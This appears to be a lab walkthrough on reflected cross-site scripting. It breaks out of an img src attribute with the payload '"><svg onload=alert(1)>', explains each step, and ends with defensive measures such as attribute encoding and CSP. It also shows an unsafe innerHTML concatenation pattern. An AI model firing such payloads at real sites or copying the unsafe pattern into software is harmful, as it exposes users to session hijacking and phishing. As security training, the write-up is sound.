# Reflected Cross-Site Scripting (XSS) — Breaking Out of an `img` Attribute

## 1. Vulnerability

**Vulnerability:** Reflected Cross-Site Scripting (Reflected XSS)

**Severity:** Medium

**Injection Context:** HTML attribute (`img src`)

**Payload:**

```html
"><svg onload=alert(1)>
```

### Description

The application takes user-controlled input from the search parameter and places it directly inside an `img` element's `src`attribute without properly encoding the input.

Because the input is inserted into an HTML attribute context, an attacker can use a quotation mark (`"`) to terminate the existing `src` attribute and then inject a new HTML element containing JavaScript execution through an event handler.

---

# 2. Objective

The objective of this lab is to:

- Identify where user-controlled input is inserted into the HTML page.
- Determine the HTML context in which the input is reflected.
- Break out of an existing HTML attribute.
- Inject a new HTML element.
- Trigger JavaScript execution using an SVG `onload` event.
- Understand how context-specific output encoding prevents this vulnerability.

---

# 3. Step-by-Step Exploitation

## Step 1 — Enter a Random String

Enter a random alphanumeric string into the search box.

For example:

```
test123
```

Click:

**Search**

The purpose of this step is to determine **where the application's output is placed in the HTML source**.


---
<img width="1388" height="820" alt="Screenshot 2026-09-23 at 8 03 02 PM" src="https://github.com/user-attachments/assets/47f82c9f-9ed3-463c-8d77-e80017f80de1" />



# 4. Step 2 — Inspect the HTML

Right-click the page and select:

**Inspect**

Alternatively, open Developer Tools using the browser's developer tools shortcut.

Search the HTML for the random string you submitted.

You may observe something similar to:

```html
<img src="test123">
```

This is an important discovery.

It shows that the supplied input is being inserted directly inside the `src` attribute of an `<img>` element.

Therefore, the current context is:

```
HTML attribute context
        ↓
<img src="USER_INPUT">
```

---


<img width="1327" height="753" alt="Screenshot 2026-09-23 at 8 05 04 PM" src="https://github.com/user-attachments/assets/5b21b0c7-098e-4feb-8472-f5de4a617911" />



.....


# 5. Step 3 — Identify the Injection Point

The application effectively produces:

```html
<img src="YOUR_INPUT">
```

If the input is:

```
test123
```

the resulting HTML becomes:

```html
<img src="test123">
```

The goal is therefore to escape from the `src` attribute.

---



<img width="1327" height="753" alt="Screenshot 2026-09-23 at 8 05 04 PM" src="https://github.com/user-attachments/assets/7782d647-fd36-4d8f-9d87-51f4c10d31fd" />


....


# 6. Step 4 — Break Out of the Attribute

Use the following payload:

```html
"><svg onload=alert(1)>
```

Enter it into the search box and submit the search.

---




<img width="1378" height="765" alt="Screenshot 2026-09-23 at 8 06 37 PM" src="https://github.com/user-attachments/assets/8a0eec45-bb87-468e-8ec9-e9e8810bef16" />

....



# 7. Step 5 — Understand the Payload

The payload consists of several parts:

```html
"><svg onload=alert(1)>
```

### `"`

The double quote terminates the existing `src` attribute.

The original HTML:

```html
<img src="USER_INPUT">
```

becomes:

```html
<img src="">
```

after the injected quote closes the attribute.

---

### `>`

The `>` closes the `<img>` tag.

This allows the attacker to start injecting additional HTML.

---

### `<svg>`

Introducing a new SVG element the resulting structure is similar to:

```html
<img src=""><svg onload=alert(1)>
```

---

### `onload=alert(1)`

The SVG element has an `onload` event handler.

When the SVG element is loaded by the browser, the event handler executes:

```jsx
alert(1)
```

---


---

# 8. Step 6 — Confirm the Vulnerability

After submitting the payload:

```html
"><svg onload=alert(1)>
```

the browser should display a JavaScript alert containing:

```
1
```


The alert confirms that attacker-controlled JavaScript was executed in the browser.


......



<img width="1460" height="856" alt="Screenshot 2026-09-23 at 8 07 09 PM" src="https://github.com/user-attachments/assets/f7fa40ed-0446-49b8-b53d-f09498942ef5" />


---



<img width="1450" height="805" alt="Screenshot 2026-09-23 at 8 07 48 PM" src="https://github.com/user-attachments/assets/a5e8d3b0-22b3-41c2-a032-1c5904960a72" />


......


# 9. What Happened Internally?

The application originally generates something similar to:

```html
<img src="USER_INPUT">
```

With a normal input:

```
test123
```

the browser receives:

```html
<img src="test123">
```

After supplying:

```html
"><svg onload=alert(1)>
```

the resulting HTML can become:

```html
<img src=""><svg onload=alert(1)>
```

The injected quotation mark escapes the original attribute, while the SVG element introduces an executable event handler.

---

# 10. Why the Vulnerability Exists

The root cause is **improper handling of untrusted data in an HTML attribute context**.

The application should treat the user's search input as data.

Instead, it inserts the input directly into HTML:

```html
<img src="USER_INPUT">
```

Without proper attribute encoding, characters such as:

```
"
<
>
```

can change the structure of the HTML document.

---

# 11. Impact

Depending on the application's functionality and the victim's privileges, Reflected XSS may allow an attacker to:

- Execute JavaScript in a victim's browser.
- Modify webpage content.
- Perform actions using the victim's authenticated session.
- Conduct phishing attacks within the trusted application.
- Access information exposed to JavaScript.
- Target privileged users such as administrators.

The actual impact depends on the application's architecture and available security controls.

---

# 12. Defensive Measures

## 12.1 Context-Aware Output Encoding

Because the input is placed inside an HTML attribute, the application should apply **HTML attribute encoding**.

For example, characters such as:

```
"
'
<
>
&
```

must be appropriately encoded when inserted into an HTML attribute.

The exact encoding strategy should match the output context.

---

## 12.2 Avoid Direct HTML Construction

Avoid constructing HTML by concatenating untrusted input.

Unsafe pattern:

```jsx
element.innerHTML = '<img src="' + userInput + '">';
```

Prefer safe DOM APIs where possible.

For example:

```jsx
const img = document.createElement('img');
img.src = userInput;
```

Even with safer APIs, developers should validate that the supplied value is appropriate for the intended URL/resource context.

---

## 12.3 Validate Input

Where appropriate, validate the expected format of the input.

For example, if a value is expected to contain only a specific set of characters, reject unexpected characters rather than allowing arbitrary HTML syntax.

Input validation should complement—not replace—proper output encoding.

---

## 12.4 Content Security Policy

Implement a strong **Content Security Policy (CSP)** as an additional layer of defense.

For example:

```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

CSP should be treated as defense in depth and should not replace correct output encoding.

---

## 12.5 Avoid Inline Event Handlers

Avoid inline JavaScript event handlers such as:

```html
onload=
onclick=
onerror=
```

Use JavaScript event listeners instead.

---


